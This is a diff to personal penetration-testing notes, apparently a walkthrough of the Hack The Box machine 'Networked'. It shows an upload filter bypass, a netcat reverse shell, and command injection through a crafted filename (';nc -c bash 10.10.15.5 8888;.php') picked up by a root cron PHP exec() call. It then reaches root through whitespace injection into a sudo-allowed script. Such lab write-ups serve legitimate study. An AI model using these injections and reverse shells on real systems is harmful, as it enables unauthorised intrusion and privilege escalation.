@@ -6,6 +6,12 @@ to achieve command execution
 
 UPLOAD FILTER BYPASS OSCP CHEATSHEET
 GIF Shell.php.gif
+
+Use of crontab mis config + PHP exec()
+We use the file path on the script to get access to user account
+
+We use sudo -l privileges to become root
+https://0xdf.gitlab.io/2019/11/16/htb-networked.html
 ###############
 
 1-Enummeration:
@@ -56,4 +62,67 @@ GIF Shell.php.gif
 
 
 2-Exploit - Privc Esc:
+    # Kali
+        nc -lvnp 4443
 
+    # Web Server:
+        http://10.129.74.244/photos.php
+
+    # We got a reverse shell
+
+        sh-4.2$ id
+        uid=48(apache) gid=48(apache) groups=48(apache)
+
+    # We are able to read the crontab job an the associated php code:
+        sh-4.2$ ls -la
+        -r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
+        -rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
+
+
+    # We will modify the check_attack.php code:
+        We saw the exec() in php wich let us execute any system cmd and the $path that load a "File Path"
+        We will exploit :
+            $path = '/var/www/html/uploads/'
+            exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+
+    # For that lets go to :
+        cd /var/www/html/uploads
+
+    # We will generate a reverse shell via nc and bash:
+        touch -- ';nc -c bash 10.10.15.5 8888;.php'
+        touch -- ';nc -c bash 10.10.15.5 9002;.php'
+
+
+    # We got a reverse shell with guly account:
+        id
+        uid=1000(guly) gid=1000(guly) groups=1000(guly)
+
+    # We Check the sudo -l permission:
+        sudo -l
+        User guly may run the following commands on networked:
+            (root) NOPASSWD: /usr/local/sbin/changename.sh
+
+    # We take a look into the .sh:
+        cat > /etc/sysconfig/network-scripts/ifcfg-guly 
+
+    # We will abuse this part of the script:
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+
+
+
+    2-Abusing of "White Space" full disclosure RedHat issue :
+        We run the command:
+            sudo /usr/local/sbin/changename.sh
+
+        interface NAME:
+            abc /bin/bash
+        interface PROXY_METHOD:
+            abc
+        interface BROWSER_ONLY:
+            abc
+        interface BOOTPROTO:
+            abc
+        id
+            uid=0(root) gid=0(root) groups=0(root)
+
+    Now we are root
